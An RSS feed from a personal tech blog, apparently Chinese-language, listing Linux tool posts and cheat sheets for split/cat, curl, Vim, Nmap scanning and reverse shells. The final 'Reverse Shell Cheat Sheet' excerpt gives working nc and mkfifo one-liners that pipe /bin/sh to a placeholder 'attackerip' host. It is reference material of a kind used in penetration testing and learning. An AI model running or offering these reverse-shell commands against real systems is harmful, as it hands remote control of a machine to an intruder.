<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tools on WhereIsMyMind</title><link>https://hare.one/tags/tools/</link><description>Recent content in Tools on WhereIsMyMind</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 08 Jan 2021 21:23:53 +0800</lastBuildDate><atom:link href="https://hare.one/tags/tools/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux 下的文件按照数字编号顺序排列</title><link>https://hare.one/posts/list-and-sort/</link><pubDate>Fri, 08 Jan 2021 21:23:53 +0800</pubDate><guid>https://hare.one/posts/list-and-sort/</guid><description>&lt;p>今天在终端下使用 &lt;code>ls&lt;/code> 命令的时候，发现没办法直接满足按照阿拉伯数字顺序排列的需求。&lt;/p></description></item><item><title>Linux 下的文件分割与合并命令 Split &amp; Cat</title><link>https://hare.one/posts/split-and-cat/</link><pubDate>Tue, 13 Oct 2020 16:10:22 +0800</pubDate><guid>https://hare.one/posts/split-and-cat/</guid><description>&lt;p>最近的工作中，需要处理大型的文本文件，这在预览上很不方便，这种情况下，可以使用 Linux 下的 split 命令进行分割。&lt;/p>
&lt;h2 id="按照文件的大小进行分割">按照文件的大小进行分割&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -b 10k input_file.txt output_file -d -a &lt;span style="color:#ae81ff">3&lt;/span>
&lt;span style="color:#75715e"># -b 值为每一输出文件的大小&lt;/span>
&lt;span style="color:#75715e"># -d 使用数字作为后缀&lt;/span>
&lt;span style="color:#75715e"># -a 值为后缀长度&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>将输入的文件按照 &lt;em>10k&lt;/em> 的大小进行分割，输出的分割文件以 &lt;em>output_file&lt;/em> 开头进行命名，数字作为输出的分割文件后缀，长度为 &lt;em>3&lt;/em>&lt;/p>
&lt;h2 id="按照文件的行数进行分割">按照文件的行数进行分割&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -l &lt;span style="color:#ae81ff">10&lt;/span> input_file.txt
&lt;span style="color:#75715e"># -l 值为分割的行数&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>将输入的文件按照 &lt;em>10&lt;/em> 行每文件进行分割&lt;/p>
&lt;h2 id="文件合并">文件合并&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cat output* &amp;gt; new_file.txt
&lt;/code>&lt;/pre>&lt;/div>&lt;p>将以 &lt;em>output&lt;/em> 开头的文件按照顺序合并，并生成 &lt;em>new_file.txt&lt;/em> 文件&lt;/p></description></item><item><title>Curl Cheat Sheet</title><link>https://hare.one/cheatsheet/curl-cheat-sheet/</link><pubDate>Fri, 17 Jul 2020 16:30:13 +0800</pubDate><guid>https://hare.one/cheatsheet/curl-cheat-sheet/</guid><description>&lt;h3 id="options">Options&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -o &amp;lt;file&amp;gt; &lt;span style="color:#75715e"># --output: write to file&lt;/span>
curl -u user:pass &lt;span style="color:#75715e"># --user: Authentication&lt;/span>
curl -v &lt;span style="color:#75715e"># --verbose&lt;/span>
curl -vv &lt;span style="color:#75715e"># Even more verbose&lt;/span>
curl -s &lt;span style="color:#75715e"># --silent&lt;/span>
curl -i &lt;span style="color:#75715e"># --include: Include the HTTP-header in the output&lt;/span>
curl -I &lt;span style="color:#75715e"># --head: headers only&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Vim Cheat Sheet</title><link>https://hare.one/cheatsheet/vim-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:32:10 +0800</pubDate><guid>https://hare.one/cheatsheet/vim-cheat-sheet/</guid><description>&lt;h3 id="全局">全局&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:h[elp] 关键字 - 打开关键字帮助
:sav[eas] 文件名 - 另存为
:clo[se] - 关闭当前窗口
:ter[minal] - open a terminal window
K - 打开光标所在单词的man页面
&lt;/code>&lt;/pre></description></item><item><title>Nmap Cheat Sheet</title><link>https://hare.one/cheatsheet/namp-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:27:34 +0800</pubDate><guid>https://hare.one/cheatsheet/namp-cheat-sheet/</guid><description>&lt;h3 id="nmap-target-selection">Nmap Target Selection&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single IP&lt;/span>
nmap 192.168.1.1
&lt;span style="color:#75715e">#Scan a host&lt;/span>
nmap www.testhostname.com
&lt;span style="color:#75715e">#Scan a range of IPs&lt;/span>
nmap 192.168.1.1-20
&lt;span style="color:#75715e">#Scan a subnet&lt;/span>
nmap 192.168.1.0/24
&lt;span style="color:#75715e">#Scan targets from a text file&lt;/span>
nmap -iL list-of-ips.txt
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Reverse Shell Cheat Sheet</title><link>https://hare.one/cheatsheet/reverse-shell-cheat-sheet/</link><pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate><guid>https://hare.one/cheatsheet/reverse-shell-cheat-sheet/</guid><description>&lt;h2 id="利用-nc-监听端口">利用 nc 监听端口&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -lvp &lt;span style="color:#ae81ff">2333&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nc-版本">nc 版本&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -e /bin/sh attackerip &lt;span style="color:#ae81ff">2333&lt;/span>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip &lt;span style="color:#ae81ff">2333&lt;/span> &amp;gt;/tmp/f
nc attackerip 8888|/bin/sh|nc attackerip &lt;span style="color:#ae81ff">9999&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>